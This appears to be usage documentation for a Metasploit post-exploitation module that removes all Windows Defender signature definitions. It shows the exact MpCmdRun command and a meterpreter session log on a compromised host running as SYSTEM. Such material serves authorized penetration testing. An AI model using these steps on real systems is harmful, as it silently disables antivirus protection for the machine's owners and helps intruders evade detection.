
This module requires system privs

This module rolls back the signatures in windows defender to the
earliest signatures.  The level of protection is somewhat indeterminate.
This action is accomplished by running the command:
`MpCmdRun.exe -RemoveDefinitions -All`

To recover, you can run
`MpCmdRun.exe -UpdateSignatures`
That will force defender to update the signatures to the latest version
from 


###Vulnerable Applications
Windows defender is the target, though this is a feature

###Verification Steps
```
msf5 post(windows/manage/rollback_defender_signatures) > sessions -i -1
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer        : WIN-5ADJK2NT7IJ
OS              : Windows 7 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 3...
msf5 post(windows/manage/rollback_defender_signatures) > show options

Module options (post/windows/manage/rollback_defender_signatures):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ACTION   Update           yes       Action to perform (Update/Rollback) (Accepted: Rollback, Update)
   SESSION  3                yes       The session to run this module on.

msf5 post(windows/manage/rollback_defender_signatures) > set action rollback
action => rollback
msf5 post(windows/manage/rollback_defender_signatures) > set verbose true
verbose => true
msf5 post(windows/manage/rollback_defender_signatures) > show options

Module options (post/windows/manage/rollback_defender_signatures):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ACTION   rollback         yes       Action to perform (Update/Rollback) (Accepted: rollback, update)
   SESSION  3                yes       The session to run this module on.

msf5 post(windows/manage/rollback_defender_signatures) > run

[*] program_path = C:\Program Files
[*] file_path = C:\Program Files\Windows Defender\MpCmdRun.exe
[*] Removing All Definitions for Windows Defender
[*] rollback
[*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
[*] 
Service Version: 6.1.7600.16385
Engine Version: 1.1.15400.5
AntiSpyware Signature Version: 1.281.1013.0e[*] Post module execution completed

### Options
Module options (post/windows/manage/rollback_defender_signatures):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ACTION   rollback         yes       Action to perform (Update/Rollback) (Accepted: rollback, update)
   SESSION  3                yes       The session to run this module on.

Session is standard
ACTION is what you would like to do.  Rollback rolls the definitions
back to the original, update updates the signatures.  In theory, on
a normal system, rollback will push to old definitions, and update will
return the definitions.
